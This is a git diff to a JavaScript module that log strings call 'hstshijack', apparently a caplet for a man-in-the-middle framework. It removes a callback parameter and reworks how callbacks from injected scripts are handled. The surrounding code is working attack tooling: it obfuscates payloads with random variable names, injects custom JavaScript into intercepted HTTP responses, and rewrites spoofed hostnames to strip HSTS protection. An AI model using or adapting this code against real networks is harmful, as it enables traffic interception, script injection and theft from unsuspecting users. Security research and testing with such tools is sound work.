@@ -18,7 +18,6 @@ var ignore_hosts       = [],
     custom_payloads    = []
 
 var callback_path,
-    callback_param,
     session_id,
     var_target_hosts,
     var_replacement_hosts
@@ -89,7 +88,6 @@ function configure() {
 	payload = payload_container.replace("{{payload}}", payload)
 	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
 	payload = payload.replace("obf_path_callback", callback_path)
-	payload = payload.replace("obf_param_callback", callback_param)
 	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
 	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "\nvar " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]\n" )
 	// Obfuscate payload
@@ -131,7 +129,6 @@ function showModule() {
 	logStr += "\n"
 	logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\n"
 	logStr += "    " + bold + " Callback Path" + reset + " : /" + callback_path + "\n"
-	logStr += "    " + bold + "Callback Param" + reset + " : " + callback_param + "\n"
 	logStr += "    " + bold + "       SSL Log" + reset + " : " + ssl_log.length + " host" + (ssl_log.length == 1 ? "" : "s") + "\n"
 	console.log(logStr)
 }
@@ -146,7 +143,6 @@ function onLoad() {
 	log_info("(" + green + "hstshijack" + reset + ") Generating random variable names for this session ...")
 	session_id            = randomString( 8 + Math.random() * 16 )
 	callback_path         = randomString( 8 + Math.random() * 16 )
-	callback_param        = randomString( 8 + Math.random() * 16 )
 	var_target_hosts      = randomString( 8 + Math.random() * 16 )
 	var_replacement_hosts = randomString( 8 + Math.random() * 16 )
 	log_info("(" + green + "hstshijack" + reset + ") Reading SSL log ...")
@@ -161,17 +157,22 @@ function onRequest(req, res) {
 	configure()
 	// Handle callbacks first
 	if ( req.Path == "/" + callback_path ) {
-		callback_data = atob( req.Query )
-		log_debug("(" + green + "hstshijack" + reset + ") Received callback for " + callback_data + ".")
-		new_host = callback_data.replace(/http(s|):\/\//i, "").replace(/\/.*/, "")
-		new_path = "/" + callback_data.replace(/http(s|):\/\/.*?\//i, "")
-		if ( ssl_log.indexOf(new_host) == -1 ) {
-			log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + callback_data + ".")
-			req.Hostname = new_host
-			req.Path     = new_path
-			req.Query    = ""
-			req.Body     = ""
-			req.Method   = "HEAD"
+		var callback_data = atob( req.Query )
+		if ( callback_data.match(/^http(s|):\/\//i) ) {
+			log_debug("(" + green + "hstshijack" + reset + ") Received callback for " + callback_data + ".")
+			new_host = callback_data.replace(/http(s|):\/\//i, "").replace(/\/.*/, "")
+			new_path = "/" + callback_data.replace(/http(s|):\/\/.*?\//i, "")
+			if ( ssl_log.indexOf(new_host) == -1 ) {
+				log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + callback_data + ".")
+				req.Hostname = new_host
+				req.Path     = new_path
+				req.Query    = ""
+				req.Body     = ""
+				req.Method   = "HEAD"
+			}
+		} else {
+			// Silent callback received
+			req.Scheme = "ignore"
 		}
 	} else {
 		// Patch spoofed hostnames in headers
@@ -309,9 +310,8 @@ function onResponse(req, res) {
 				regexp = wildcardToRegexp(custom_payload_host)
 				if ( req.Hostname.match(regexp) ) {
 					custom_payload = readFile(custom_payload_path)
-					// Insert callback path and parameter if required
+					// Insert callback path if required
 					custom_payload = custom_payload.replace(/obf_path_callback/g, callback_path)
-					custom_payload = custom_payload.replace(/obf_param_callback/g, callback_param)
 					// Obfsucate payload if required
 					obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
 					for (var b = 0; b < obfuscation_variables.length; b++) {
